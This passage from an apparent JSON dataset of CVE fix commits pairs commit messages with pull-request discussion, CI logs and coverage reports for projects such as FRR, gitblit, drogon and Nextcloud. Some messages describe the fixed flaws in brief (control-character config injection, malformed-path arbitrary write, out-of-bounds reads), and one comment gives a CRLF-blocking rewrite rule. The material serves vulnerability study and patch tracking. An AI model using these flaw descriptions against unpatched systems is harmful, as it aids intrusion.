/tmp/f1-4970/yang_wrappers.c:709:\n\n</details>\n\n</details> <details><summary>Continuous Integration Result: SUCCESSFUL</summary>\n\n#  Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3618/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n### Warnings Generated during build:\n\n<details><summary>Checkout code: Successful with additional warnings</summary>\n\n    Report for base64.c | 25 issues\n    ===============================================\n    WARNING: quoted string split across lines\n    #21: FILE: /tmp/f1-30139/base64.c:21:\n    +\t\t\"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n    +\t\t\"abcdefghijklmnopqrstuvwxyz\"\n    \n    WARNING: break quoted strings at a space character\n    #21: FILE: /tmp/f1-30139/base64.c:21:\n    +\t\t\"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n    +\t\t\"abcdefghijklmnopqrstuvwxyz\"\n    \n    WARNING: quoted string split across lines\n    #22: FILE: /tmp/f1-30139/base64.c:22:\n    +\t\t\"abcdefghijklmnopqrstuvwxyz\"\n    +\t\t\"0123456789+/\";\n    \n    WARNING: break quoted strings at a space character\n    #22: FILE: /tmp/f1-30139/base64.c:22:\n    +\t\t\"abcdefghijklmnopqrstuvwxyz\"\n    +\t\t\"0123456789+/\";\n    \n    WARNING: suspect code indent for conditional statements (16, 16)\n    #145: FILE: /tmp/f1-30139/base64.c:145:\n    +\t\twhile (1) {\n    +\t\tcase step_a:\n    Report for yang_wrappers.c | 2 issues\n    ===============================================\n    < WARNING: Missing a blank line after declarations\n    < #700: FILE: /tmp/f1-30139/yang_wrappers.c:700:\n\n</details>\n\n</details> <details><summary>Continuous Integration Result: SUCCESSFUL</summary>\n\n#  Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3621/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n### Warnings Generated during build:\n\n<details><summary>Checkout code: Successful with additional warnings</summary>\n\n    Report for base64.c | 25 issues\n    ===============================================\n    WARNING: quoted string split across lines\n    #21: FILE: /tmp/f1-25610/base64.c:21:\n    +\t\t\"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n    +\t\t\"abcdefghijklmnopqrstuvwxyz\"\n    \n    WARNING: break quoted strings at a space character\n    #21: FILE: /tmp/f1-25610/base64.c:21:\n    +\t\t\"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n    +\t\t\"abcdefghijklmnopqrstuvwxyz\"\n    \n    WARNING: quoted string split across lines\n    #22: FILE: /tmp/f1-25610/base64.c:22:\n    +\t\t\"abcdefghijklmnopqrstuvwxyz\"\n    +\t\t\"0123456789+/\";\n    \n    WARNING: break quoted strings at a space character\n    #22: FILE: /tmp/f1-25610/base64.c:22:\n    +\t\t\"abcdefghijklmnopqrstuvwxyz\"\n    +\t\t\"0123456789+/\";\n    \n    WARNING: suspect code indent for conditional statements (16, 16)\n    #145: FILE: /tmp/f1-25610/base64.c:145:\n    +\t\twhile (1) {\n    +\t\tcase step_a:\n    Report for yang_wrappers.c | 2 issues\n    ===============================================\n    < WARNING: Missing a blank line after declarations\n    < #700: FILE: /tmp/f1-25610/yang_wrappers.c:700:\n\n</details>\n\n</details> <details><summary>Continuous Integration Result: FAILED</summary>\n\n#  Continuous Integration Result: FAILED\n\nSee below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3622/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n### Get source / Pull Request: Successful\n### Building Stage: Successful\n### Basic Tests: Failed\n<details>\n<summary>Topotests Ubuntu 18.04 amd64 part 9: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO9U18AMD64-3622/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 amd64 part 9__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3622/artifact/TOPO9U18AMD64/ErrorLog/log_topotests.txt\n</details>\n<details><summary>Successful on other platforms/tests</summary>\n\n- Topotests Ubuntu 18.04 arm8 part 5\n- CentOS 7 rpm pkg check\n- Topotests Ubuntu 18.04 i386 part 9\n- Addresssanitizer topotests part 6\n- Topotests debian 10 amd64 part 1\n- Topotests Ubuntu 18.04 i386 part 5\n- Topotests Ubuntu 18.04 amd64 part 1\n- Static analyzer (clang)\n- Topotests debian 10 amd64 part 7\n- Topotests Ubuntu 18.04 arm8 part 0\n- Topotests Ubuntu 18.04 i386 part 0\n- Topotests Ubuntu 18.04 amd64 part 8\n- Topotests debian 10 amd64 part 2\n- Addresssanitizer topotests part 0\n- Topotests debian 10 amd64 part 3\n- Topotests Ubuntu 18.04 amd64 part 6\n- Topotests Ubuntu 18.04 arm8 part 6\n- Ubuntu 18.04 deb pkg check\n- Topotests Ubuntu 18.04 arm8 part 1\n- Addresssanitizer topotests part 1\n- Topotests Ubuntu 18.04 i386 part 4\n- Topotests debian 10 amd64 part 6\n- Addresssanitizer topotests part 4\n- Debian 9 deb pkg check\n- Topotests debian 10 amd64 part 5\n- Addresssanitizer topotests part 8\n- Topotests Ubuntu 18.04 i386 part 7\n- Addresssanitizer topotests part 7\n- Topotests Ubuntu 18.04 arm8 part 8\n- Topotests debian 10 amd64 part 4\n- Topotests Ubuntu 18.04 amd64 part 3\n- Topotests Ubuntu 18.04 arm8 part 3\n- Topotests Ubuntu 18.04 i386 part 2\n- Topotests debian 10 amd64 part 9\n- Topotests Ubuntu 18.04 amd64 part 2\n- Addresssanitizer topotests part 5\n- IPv4 ldp protocol on Ubuntu 18.04\n- Ubuntu 16.04 deb pkg check\n- Debian 10 deb pkg check\n- Topotests debian 10 amd64 part 8\n- IPv6 protocols on Ubuntu 18.04\n- Topotests Ubuntu 18.04 i386 part 6\n- Topotests Ubuntu 18.04 arm8 part 4\n- Topotests Ubuntu 18.04 amd64 part 4\n- Topotests Ubuntu 18.04 i386 part 1\n- Topotests Ubuntu 18.04 amd64 part 5\n- Topotests Ubuntu 18.04 amd64 part 0\n- Topotests Ubuntu 18.04 arm8 part 9\n- Addresssanitizer topotests part 2\n- Ubuntu 20.04 deb pkg check\n- Topotests Ubuntu 18.04 amd64 part 7\n- IPv4 protocols on Ubuntu 18.04\n- Topotests Ubuntu 18.04 arm8 part 7\n- Addresssanitizer topotests part 3\n- Fedora 29 rpm pkg check\n- Addresssanitizer topotests part 9\n- Topotests debian 10 amd64 part 0\n- Topotests Ubuntu 18.04 i386 part 8\n- Topotests Ubuntu 18.04 i386 part 3\n- Topotests Ubuntu 18.04 arm8 part 2\n</details>\n\n### Warnings Generated during build:\n\n<details><summary>Checkout code: Successful with additional warnings</summary>\n<details>\n<summary>Topotests Ubuntu 18.04 amd64 part 9: Failed (click for details)</summary>\n\nTopology Test Results are at https://ci1.netdef.org/browse/FRR-PULLREQ2-TOPO9U18AMD64-3622/test\n\n\n__Topology Tests failed for Topotests Ubuntu 18.04 amd64 part 9__\n   see full log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3622/artifact/TOPO9U18AMD64/ErrorLog/log_topotests.txt\n</details>\n\n    Report for base64.c | 25 issues\n    ===============================================\n    WARNING: quoted string split across lines\n    #21: FILE: /tmp/f1-32587/base64.c:21:\n    +\t\t\"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n    +\t\t\"abcdefghijklmnopqrstuvwxyz\"\n    \n    WARNING: break quoted strings at a space character\n    #21: FILE: /tmp/f1-32587/base64.c:21:\n    +\t\t\"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n    +\t\t\"abcdefghijklmnopqrstuvwxyz\"\n    \n    WARNING: quoted string split across lines\n    #22: FILE: /tmp/f1-32587/base64.c:22:\n    +\t\t\"abcdefghijklmnopqrstuvwxyz\"\n    +\t\t\"0123456789+/\";\n    \n    WARNING: break quoted strings at a space character\n    #22: FILE: /tmp/f1-32587/base64.c:22:\n    +\t\t\"abcdefghijklmnopqrstuvwxyz\"\n    +\t\t\"0123456789+/\";\n    \n    WARNING: suspect code indent for conditional statements (16, 16)\n    #145: FILE: /tmp/f1-32587/base64.c:145:\n    +\t\twhile (1) {\n    +\t\tcase step_a:\n    Report for yang_wrappers.c | 2 issues\n    ===============================================\n    < WARNING: Missing a blank line after declarations\n    < #700: FILE: /tmp/f1-32587/yang_wrappers.c:700:\n\n</details>\n\n</details> # Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3623/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n > @whichbug can you please cleanup the style and we will merge it.\r\n\r\nall issues addressed.",
            "pr_title_words": 8,
            "comments_words": 42284,
            "total_other_info_words": 42292
        },
        {
            "cve-id": "CVE-2022-34300",
            "commit_url": "https://github.com/syoyo/tinyexr/commit/9c602a37b3d3a1d98d473cda32b88f8014344990",
            "commit_msg": "Fix out of bounds access in DecodePixelData\n\nFixes #167",
            "commit_msg_words": 9,
            "other_info": "Fix out of bounds access in DecodePixelData @roehling Super awesome! Thanks! Confirmed the PR fiexes OOB segfault for poc file attached in #167 so merged!",
            "pr_title_words": 7,
            "comments_words": 18,
            "total_other_info_words": 25
        },
        {
            "cve-id": "CVE-2022-0367",
            "commit_url": "https://github.com/stephane/libmodbus/commit/b4ef4c17d618eba0adccc4c7d9e9a1ef809fc9b6",
            "commit_msg": "modbus_reply: fix copy & paste error in sanity check (fixes #614)\n\nWhile handling MODBUS_FC_WRITE_AND_READ_REGISTERS, both address offsets\nmust be checked, i.e. the read and the write address must be within the\nmapping range.\n\nAt the moment, only the read address was considered, it looks like a\nsimple copy and paste error, so let's fix it.\n\nSigned-off-by: Michael Heimpold <mhei@heimpold.de>",
            "commit_msg_words": 59,
            "other_info": "modbus_reply: fix copy & paste error in sanity check (fixes #614) Thank you @mhei \r\nAs usual, you rocks!",
            "pr_title_words": 11,
            "comments_words": 7,
            "total_other_info_words": 18
        },
        {
            "cve-id": "CVE-2022-31267",
            "commit_url": "https://github.com/gitblit-org/gitblit/commit/9b4afad6f4be212474809533ec2c280cce86501a",
            "commit_msg": "fix: Fix StoredUserConfig not escaping control characters\n\nThe `StoredUserConfig` only escaped the escape character, i.e. backslash.\nBut it does not escape control characters like tab or newline. This\nintroduces a vulnerability where an attacker can create new entries\nin their user account and create new accounts.\nIn addition, other characters are also not properly handled. Field values\nwith a comment character need to be quoted. This only happens for the\n`#` character and only when the value starts with it. Also the quote\nis note escaped in values.\n\nThis change completely rewrites the `escape` method of `StoredUserConfig`.\nIt takes care of properly escaping characters that need escaping for the\ngit configuration file format.\n\nThis fixes #1410",
            "commit_msg_words": 116,
            "other_info": "Fix vulnerability in config user service backend",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2022-3676",
            "commit_url": "https://github.com/eclipse/omr/commit/f5ab765943c192e25ac8ea8d341f88e6ed9f90d2",
            "commit_msg": "Stop devirtualizing interface calls in preexistence\n\nPreviously, it was possible for the JIT to devirtualize an interface\ncall, and for execution to reach the call (whether inlined or not) with\na receiver that is not an instance of the class expected by the\nimplementing method. The callee could then access fields of the receiver\nas though it were of the expected type.\n\nThe conditionals added in this commit still allow (on their own) for an\ninterface call to be devirtualized when preexistence has already proven\nthat the receiver is an instance of some particular class that\nimplements the expected interface. However, preexistence currently fails\nto devirtualize in that situation. It passes the class to\nTR_PersistentCHTable::findSingleInterfaceImplementer(), which needs the\ninterface. This can be improved in the future by having preexistence\ntreat the call in the same way as a non-interface call, but with the\nadded requirement that the devirtualized callee must be public.",
            "commit_msg_words": 152,
            "other_info": "Stop devirtualizing interface calls in preexistence Jenkins build all Checks have passed except for known infra issues. The changes are quite safe in that we simply avoid optimizing in some cases where we cannot rely on signatures. Merging.",
            "pr_title_words": 6,
            "comments_words": 32,
            "total_other_info_words": 38
        },
        {
            "cve-id": "CVE-2022-39334",
            "commit_url": "https://github.com/nextcloud/desktop/commit/49305319496965ecf18963a81bf8a5a69df0d97e",
            "commit_msg": "Command-line client. Do not trust SSL certificates by default, unlss '--trust' option is set.\n\nSigned-off-by: allexzander <blackslayer4@gmail.com>",
            "commit_msg_words": 17,
            "other_info": "Command-line client. Do not trust SSL certificates by default, unless '--trust' option is set. # [Codecov](https://codecov.io/gh/nextcloud/desktop/pull/5022?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud) Report\n> Merging [#5022](https://codecov.io/gh/nextcloud/desktop/pull/5022?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud) (e721f93) into [master](https://codecov.io/gh/nextcloud/desktop/commit/256aa522020610d41d7fd2e1b6f7a604b42f4fcc?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud) (256aa52) will **decrease** coverage by `0.12%`.\n> The diff coverage is `14.28%`.\n\n> :exclamation: Current head e721f93 differs from pull request most recent head 564a3ad. Consider uploading reports for the commit 564a3ad to get more accurate results\n\n<details><summary>Additional details and impacted files</summary>\n\n\n```diff\n@@            Coverage Diff             @@\n##           master    #5022      +/-   ##\n==========================================\n- Coverage   57.28%   57.16%   -0.13%     \n==========================================\n  Files         138      138              \n  Lines       17394    17401       +7     \n==========================================\n- Hits         9965     9947      -18     \n- Misses       7429     7454      +25     \n```\n\n\n\n| [Impacted Files](https://codecov.io/gh/nextcloud/desktop/pull/5022?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud) | Coverage \u0394 | |\n|---|---|---|\n| [src/libsync/account.cpp](https://codecov.io/gh/nextcloud/desktop/pull/5022/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-c3JjL2xpYnN5bmMvYWNjb3VudC5jcHA=) | `38.00% <0.00%> (-0.47%)` | :arrow_down: |\n| [src/libsync/account.h](https://codecov.io/gh/nextcloud/desktop/pull/5022/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-c3JjL2xpYnN5bmMvYWNjb3VudC5o) | `33.33% <100.00%> (+3.92%)` | :arrow_up: |\n| [src/libsync/vfs/cfapi/hydrationjob.cpp](https://codecov.io/gh/nextcloud/desktop/pull/5022/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-c3JjL2xpYnN5bmMvdmZzL2NmYXBpL2h5ZHJhdGlvbmpvYi5jcHA=) | `52.38% <0.00%> (-3.71%)` | :arrow_down: |\n| [src/libsync/filesystem.cpp](https://codecov.io/gh/nextcloud/desktop/pull/5022/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-c3JjL2xpYnN5bmMvZmlsZXN5c3RlbS5jcHA=) | `73.11% <0.00%> (-3.23%)` | :arrow_down: |\n| [src/libsync/vfs/cfapi/vfs\\_cfapi.cpp](https://codecov.io/gh/nextcloud/desktop/pull/5022/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-c3JjL2xpYnN5bmMvdmZzL2NmYXBpL3Zmc19jZmFwaS5jcHA=) | `83.39% <0.00%> (-2.38%)` | :arrow_down: |\n| [src/libsync/vfs/cfapi/cfapiwrapper.cpp](https://codecov.io/gh/nextcloud/desktop/pull/5022/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-c3JjL2xpYnN5bmMvdmZzL2NmYXBpL2NmYXBpd3JhcHBlci5jcHA=) | `72.50% <0.00%> (-1.82%)` | :arrow_down: |\n| [src/libsync/syncengine.cpp](https://codecov.io/gh/nextcloud/desktop/pull/5022/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-c3JjL2xpYnN5bmMvc3luY2VuZ2luZS5jcHA=) | `82.88% <0.00%> (-0.46%)` | :arrow_down: |\n| [src/libsync/propagatedownload.cpp](https://codecov.io/gh/nextcloud/desktop/pull/5022/diff?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=nextcloud#diff-c3JjL2xpYnN5bmMvcHJvcGFnYXRlZG93bmxvYWQuY3Bw) | `64.61% <0.00%> (+1.17%)` | :arrow_up: |\n\n</details> @claucambra I had to fix a small logic error and re-request a review. It does not really affect much but it's best to keep it right. AppImage file: [nextcloud-PR-5022-564a3ad987a40135c9d6dedd5a1238caf0ce2d52-x86_64.AppImage](https://github.com/nextcloud-desktop-bot/ci-builds/releases/download/PR-5022/nextcloud-PR-5022-564a3ad987a40135c9d6dedd5a1238caf0ce2d52-x86_64.AppImage) <br/><br/>To test this change/fix you can simply download above AppImage file and test it. <br/><br/>Please make sure to quit your existing Nextcloud app and backup your data.  SonarCloud Quality Gate failed.&nbsp; &nbsp; [![Quality Gate failed](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/QualityGateBadge/failed-16px.png 'Quality Gate failed')](https://sonarcloud.io/dashboard?id=nextcloud_desktop&pullRequest=5022)\n\n[![Bug](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/bug-16px.png 'Bug')](https://sonarcloud.io/project/issues?id=nextcloud_desktop&pullRequest=5022&resolved=false&types=BUG) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=nextcloud_desktop&pullRequest=5022&resolved=false&types=BUG) [0 Bugs](https://sonarcloud.io/project/issues?id=nextcloud_desktop&pullRequest=5022&resolved=false&types=BUG)  \n[![Vulnerability](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/vulnerability-16px.png 'Vulnerability')](https://sonarcloud.io/project/issues?id=nextcloud_desktop&pullRequest=5022&resolved=false&types=VULNERABILITY) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=nextcloud_desktop&pullRequest=5022&resolved=false&types=VULNERABILITY) [0 Vulnerabilities](https://sonarcloud.io/project/issues?id=nextcloud_desktop&pullRequest=5022&resolved=false&types=VULNERABILITY)  \n[![Security Hotspot](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/security_hotspot-16px.png 'Security Hotspot')](https://sonarcloud.io/project/security_hotspots?id=nextcloud_desktop&pullRequest=5022&resolved=false&types=SECURITY_HOTSPOT) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/security_hotspots?id=nextcloud_desktop&pullRequest=5022&resolved=false&types=SECURITY_HOTSPOT) [0 Security Hotspots](https://sonarcloud.io/project/security_hotspots?id=nextcloud_desktop&pullRequest=5022&resolved=false&types=SECURITY_HOTSPOT)  \n[![Code Smell](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/code_smell-16px.png 'Code Smell')](https://sonarcloud.io/project/issues?id=nextcloud_desktop&pullRequest=5022&resolved=false&types=CODE_SMELL) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=nextcloud_desktop&pullRequest=5022&resolved=false&types=CODE_SMELL) [2 Code Smells](https://sonarcloud.io/project/issues?id=nextcloud_desktop&pullRequest=5022&resolved=false&types=CODE_SMELL)\n\n[![0.0%](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/CoverageChart/0-16px.png '0.0%')](https://sonarcloud.io/component_measures?id=nextcloud_desktop&pullRequest=5022&metric=new_coverage&view=list) [0.0% Coverage](https://sonarcloud.io/component_measures?id=nextcloud_desktop&pullRequest=5022&metric=new_coverage&view=list)  \n[![0.0%](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/Duplications/3-16px.png '0.0%')](https://sonarcloud.io/component_measures?id=nextcloud_desktop&pullRequest=5022&metric=new_duplicated_lines_density&view=list) [0.0% Duplication](https://sonarcloud.io/component_measures?id=nextcloud_desktop&pullRequest=5022&metric=new_duplicated_lines_density&view=list)\n\n /backport to stable-3.6",
            "pr_title_words": 14,
            "comments_words": 277,
            "total_other_info_words": 291
        },
        {
            "cve-id": "CVE-2022-29181",
            "commit_url": "https://github.com/sparklemotion/nokogiri/commit/db05ba9a1bd4b90aa6c76742cf6102a7c7297267",
            "commit_msg": "fix: {HTML4,XML}::SAX::{Parser,ParserContext} check arg types\n\nPreviously, arguments of the wrong type might cause segfault on CRuby.",
            "commit_msg_words": 16,
            "other_info": "SAX::Parser constructors check types",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2022-35938",
            "commit_url": "https://github.com/tensorflow/tflite-micro/commit/4142e47e9e31db481781b955ed3ff807a781b494",
            "commit_msg": "GatherNd verifies that an index is valid before reading. (#1286)",
            "commit_msg_words": 10,
            "other_info": "GatherNd verifies that an index is valid before reading.",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2022-22894",
            "commit_url": "https://github.com/jerryscript-project/jerryscript/commit/99c81be1a20f736b025a25a9061c89de09241120",
            "commit_msg": "Add stack-overflow check for Array.prototype.{flat, flatMap}\n\nThis patch fixes #4890\n\nJerryScript-DCO-1.0-Signed-off-by: Robert Fancsik robert.fancsik@h-lab.eu",
            "commit_msg_words": 14,
            "other_info": "Add stack-overflow check for Array.prototype.{flat, flatMap}",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2022-25297",
            "commit_url": "https://github.com/drogonframework/drogon/commit/3c785326c63a34aa1799a639ae185bc9453cb447",
            "commit_msg": "Prevent malformed upload path causing arbitrary write (#1174)",
            "commit_msg_words": 8,
            "other_info": "Prevent malformed upload path causing arbitrary write @an-tao can you help me to fix C++14 issues please?",
            "pr_title_words": 7,
            "comments_words": 10,
            "total_other_info_words": 17
        },
        {
            "cve-id": "CVE-2022-0559",
            "commit_url": "https://github.com/radareorg/radare2/commit/b5cb90b28ec71fda3504da04e3cc94a362807f5e",
            "commit_msg": "Prefer memleak over usaf in io.bank's rbtree bug ##crash\n\n* That's a workaround, proper fix will come later\n* Reproducer: bins/fuzzed/iobank-crash\n* Reported by Akyne Choi via huntr.dev",
            "commit_msg_words": 28,
            "other_info": "Prefer memleak over UAF in io.bank's rbtree bug ##crash",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2022-3952",
            "commit_url": "https://github.com/ManyDesigns/Portofino/commit/94653cb357806c9cf24d8d294e6afea33f8f0775",
            "commit_msg": "vuln-fix: Temporary Directory Hijacking or Information Disclosure\n\n\n\nThis fixes either Temporary Directory Hijacking, or Temporary Directory Local Information Disclosure.\n\nWeakness: CWE-379: Creation of Temporary File in Directory with Insecure Permissions\nSeverity: High\nCVSSS: 7.3\nDetection: CodeQL & OpenRewrite (https://public.moderne.io/recipes/org.openrewrite.java.security.UseFilesCreateTempDirectory)\n\nReported-by: Jonathan Leitschuh <Jonathan.Leitschuh@gmail.com>\nSigned-off-by: Jonathan Leitschuh <Jonathan.Leitschuh@gmail.com>\n\nBug-tracker: https://github.com/JLLeitschuh/security-research/issues/10\n\n\nCo-authored-by: Moderne <team@moderne.io>",
            "commit_msg_words": 52,
            "other_info": "[SECURITY] Fix Temporary Directory Hijacking or Information Disclosure Vulnerability\n Hi @alessiostalla,\r\n\r\nDo you believe this fixed a valid security vulnerability? Do you need assistance with vulnerability disclosure and CVE issuance? Hi, yes it's a security vulnerability in theory. However, it only interests a newish, undocumented deployment option, that most probably has zero real-world usage right now, and given the evolution of the project, it's unlikely it will see much use in the future as well. Regardless of how low you believe the risk of this logics use us, if you still consider it a vulnerability, it's still worth getting a CVE for it. I can put you in touch with the Snyk team and they can take care of most of the heavy lifting here.",
            "pr_title_words": 9,
            "comments_words": 116,
            "total_other_info_words": 125
        },
        {
            "cve-id": "CVE-2022-37724",
            "commit_url": "https://github.com/wocommunity/wonder/commit/23c9775fb6afb7be1472944e02396f29771dc8e2",
            "commit_msg": "Updated the adaptors to have a config.h preproc definition which, if enabled, compiles the adaptors without the ability to check for invalid URL characters.",
            "commit_msg_words": 24,
            "other_info": "WO Adaptor URL Sanitization Fixes As stated, [here is the link to my article](https://xmit.xyz/security/webobjects-url-tomfoolery/) about the WebObjects adaptor vulnerability present in Project WONDER. If the link is inappropriate, please feel free to remove it or request such.\r\n\r\nThank you. Hi Zachary, somehow we failed to give this the proper attention when you first posted it. Reviewing your detailed article now. Reviewed the patch, and I approve merging it. I want to wait for people in other timezones to have a chance to chime in, though. Until then, we confirmed this to be mitigated by the following global apache config:\r\n\r\n```\r\nRewriteEngine On\r\nRewriteOptions InheritDown\r\nRewriteRule ^.*\\x0d\\x0a - [F,L,NC]\r\n```",
            "pr_title_words": 5,
            "comments_words": 104,
            "total_other_info_words": 109
        },
        {
            "cve-id": "CVE-2022-4899",
            "commit_url": "https://github.com/facebook/zstd/commit/e1873ad576cb478fff0e6e44ad99599cd5fd2846",
            "commit_msg": "Fix buffer underflow for null dir1",
            "commit_msg_words": 6,
            "other_info": "Disallow empty string as argument for --output-dir-flat and --output-dir-mirror Please add a test case to the cli-tests https://github.com/facebook/zstd/tree/dev/tests/cli-tests/basic LGTM once you have a test case > LGTM once you have a test case\r\n\r\nAdded a test and disallowed empty string as an argument for `--output-dir-flat` and `--output-dir-mirror`.",
            "pr_title_words": 9,
            "comments_words": 38,
            "total_other_info_words": 47
        },
        {
            "cve-id": "CVE-2022-48257",
            "commit_url": "https://github.com/MisterTea/EternalTerminal/commit/4a8b02d5f1afb38b00c77ab1321d5f56720f4e30",
            "commit_msg": "Unify logfile names and create with more secure open options and perms.\n\nFixes #555 (Tribute to Colin McRae)",
            "commit_msg_words": 18,
            "other_info": "Logfile open mode and permission plus location configurability. # [Codecov](https://codecov.io/gh/MisterTea/EternalTerminal/pull/556?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jason+Gauci) Report\nBase: **73.02**% // Head: **72.97**% // Decreases project coverage by **`-0.05%`** :warning:\n> Coverage data is based on head [(`04e64d4`)](https://codecov.io/gh/MisterTea/EternalTerminal/pull/556?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jason+Gauci) compared to base [(`7289e04`)](https://codecov.io/gh/MisterTea/EternalTerminal/commit/7289e04475a8418d376cbc7ecbcc580e23c42bb7?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jason+Gauci).\n> Patch coverage: 76.31% of modified lines in pull request are covered.\n\n<details><summary>Additional details and impacted files</summary>\n\n\n```diff\n@@            Coverage Diff             @@\n##           master     #556      +/-   ##\n==========================================\n- Coverage   73.02%   72.97%   -0.06%     \n==========================================\n  Files          50       50              \n  Lines        3029     3049      +20     \n==========================================\n+ Hits         2212     2225      +13     \n- Misses        817      824       +7     \n```\n\n\n| [Impacted Files](https://codecov.io/gh/MisterTea/EternalTerminal/pull/556?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jason+Gauci) | Coverage \u0394 | |\n|---|---|---|\n| [src/base/LogHandler.cpp](https://codecov.io/gh/MisterTea/EternalTerminal/pull/556?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jason+Gauci#diff-c3JjL2Jhc2UvTG9nSGFuZGxlci5jcHA=) | `81.35% <74.28%> (+18.19%)` | :arrow_up: |\n| [test/Main.cpp](https://codecov.io/gh/MisterTea/EternalTerminal/pull/556?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jason+Gauci#diff-dGVzdC9NYWluLmNwcA==) | `100.00% <100.00%> (\u00f8)` | |\n| [src/base/ServerConnection.cpp](https://codecov.io/gh/MisterTea/EternalTerminal/pull/556?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jason+Gauci#diff-c3JjL2Jhc2UvU2VydmVyQ29ubmVjdGlvbi5jcHA=) | `70.75% <0.00%> (-6.61%)` | :arrow_down: |\n| [src/terminal/UserTerminalHandler.cpp](https://codecov.io/gh/MisterTea/EternalTerminal/pull/556?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jason+Gauci#diff-c3JjL3Rlcm1pbmFsL1VzZXJUZXJtaW5hbEhhbmRsZXIuY3Bw) | `70.00% <0.00%> (-1.27%)` | :arrow_down: |\n| 